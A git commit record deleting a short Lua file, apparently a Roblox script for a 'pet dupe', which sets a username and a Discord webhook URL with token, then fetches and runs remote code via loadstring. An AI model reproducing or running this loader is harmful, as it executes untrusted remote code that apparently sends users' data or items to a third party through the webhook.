a3f7d0a930de41d5a1771dae2fedecb300d78e4c
Skitheguy <121530593+Skitheguy@users.noreply.github.com>
2022-12-27 22:03:53 -0500

    Delete Untitled 2.lua

--- Untitled 2.lua
+++
@@ -1,4 +0,0 @@
-UserName = "ToxicHD_BRAVO"
-WebHook = "https://discord.com/api/webhooks/1057490225011621978/R811QC9rXa4BVuxZGIJSXIc39lqfNzIKO_DQtuB_OFGGVpQBcCNbOnXYi77PWe13SMhW"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
